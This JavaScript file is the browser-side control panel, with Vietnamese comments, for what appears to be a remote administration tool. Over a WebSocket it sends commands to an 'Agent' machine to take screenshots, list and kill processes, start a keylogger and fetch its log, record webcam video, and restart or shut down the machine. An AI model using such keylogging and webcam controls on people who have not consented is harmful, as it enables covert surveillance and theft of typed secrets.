// --- HÀM GỬI LỆNH CHUNG ---
function sendCommand(cmd) {
    if (socket && socket.readyState === WebSocket.OPEN) {
        socket.send(cmd);
        log("host@admin:~$ " + cmd, true); 
    } else {
        alert("Chưa kết nối tới Server! Vui lòng kiểm tra lại.");
    }
}

// --- CÁC HÀM XỬ LÝ LỆNH (WRAPPER) ---

function getProcessCmd() {
    sendCommand("CMD_GET_PROCESS");
}

function getScreenshotCmd() {
    sendCommand("CMD_SCREENSHOT");
}

function getAppsCmd() {
    sendCommand("CMD_GET_APPS");
}

function getPingCmd() {
    sendCommand("CMD_PING");
}

function restartCmd() {
    if (confirm("CẢNH BÁO: Bạn có chắc muốn khởi động lại máy Agent?"))
        sendCommand("CMD_RESTART");
}

function shutdownCmd() {
    if (confirm("CẢNH BÁO: Bạn có chắc muốn TẮT NGUỒN máy Agent?"))
        sendCommand("CMD_SHUTDOWN");
}

// --- LOGIC KEYLOGGER (ON/OFF) ---
function getKeyLog() {
    const command = document.getElementById("keylog-cmd");
    
    // Lấy trạng thái hiện tại (mặc định off)
    const currentState = (command.dataset.state || "off").trim().toLowerCase();

    if (currentState === "off") {
        // Keylog is OFF → Turn ON
        sendCommand("CMD_KEYLOG_START");
        command.dataset.state = "on";
        command.textContent = "Stop"; 
    } else {
        // Keylog is ON → Turn OFF
        sendCommand("CMD_KEYLOG_STOP");
        
        // Lấy log về xem luôn
        setTimeout(() => sendCommand("CMD_KEYLOG_GET"), 500);

        command.dataset.state = "off";
        command.textContent = "Start";
    }
}

// --- LOGIC WEBCAM (RECORD VIDEO) ---
function toggleWebcam() {
    const command = document.getElementById("webcam-cmd");
    const durationInput = document.getElementById("webcam-duration");
    
    // Parse số giây
    let duration = parseInt(durationInput.value, 10);
    if (isNaN(duration) || duration <= 0) duration = 5; // Mặc định 5s

    const currentState = (command.dataset.state || "off").trim().toLowerCase();

    if (currentState === "off") {
        // Webcam is OFF → Turn ON (Start Recording)
        if (confirm(`Bạn có muốn quay video trong ${duration} giây?`)) {
            sendCommand(`CMD_RECORD_VIDEO:${duration}`);
            command.dataset.state = "on";
            command.textContent = "Stop"; // Đang quay
            durationInput.disabled = true;

            // Tự động reset UI sau khi quay xong (+2s delay mạng)
            setTimeout(() => {
                command.dataset.state = "off";
                command.textContent = "On"; // Quay lại trạng thái sẵn sàng bật
                durationInput.disabled = false;
            }, (duration + 2) * 1000);
        }
    } else {
        // Webcam is ON → Turn OFF (Dừng sớm)
        sendCommand("CMD_WEBCAM_STOP");
        
        command.dataset.state = "off";
        command.textContent = "On";
        durationInput.disabled = false;
    }
}

// --- UI HELPER FUNCTIONS ---

function toggleListAppPanel() {
    const panel = document.querySelector(".list-app-panel");
    const mainPanel = document.querySelector(".button-panel");
    const listAppLogBox = document.getElementById("listAppLogBox");
    if (panel.style.display === "none" || panel.style.display === "") {
        panel.style.display = "flex";
        mainPanel.style.display = "none";
        listAppLogBox.style.display = "block";
    } else {
        panel.style.display = "none";
        mainPanel.style.display = "block";
        listAppLogBox.style.display = "none";
    }
}

function toggleListProcessPanel() {
    const mainPanel = document.querySelector(".button-panel");
    const panel = document.querySelector(".list-process-panel");
    const processLogBox = document.getElementById("processLogBox");
    if (panel.style.display === "none" || panel.style.display === "") {
        panel.style.display = "flex";
        mainPanel.style.display = "none";
        processLogBox.style.display = "block";
    } else {
        panel.style.display = "none";
        mainPanel.style.display = "block";
        processLogBox.style.display = "none";
    }
}

function killProcess() {
    const pidInput = document.getElementById("process-id-input");
    const pid = pidInput.value.trim();
    if (pid) {
        sendCommand(`CMD_KILL_PROC:${pid}`);
        pidInput.value = ""; // Xóa ô nhập
    } else {
        alert("Vui lòng nhập Process ID (PID)!");
    }
}

function startApp() {
    const appInput = document.getElementById("app-id-input");
    const appName = appInput.value.trim();
    if (appName) {
        sendCommand(`CMD_START_APP:${appName}`);
    }
}

function closeApp() {
    const appInput = document.getElementById("app-id-input");
    const pid = appInput.value.trim();
    if (pid) {
        sendCommand(`CMD_KILL_PROC:${pid}`);
        appInput.value = ""; // Xóa ô nhập
    } else {
        alert("Vui lòng nhập Process ID (PID)!");
    }
}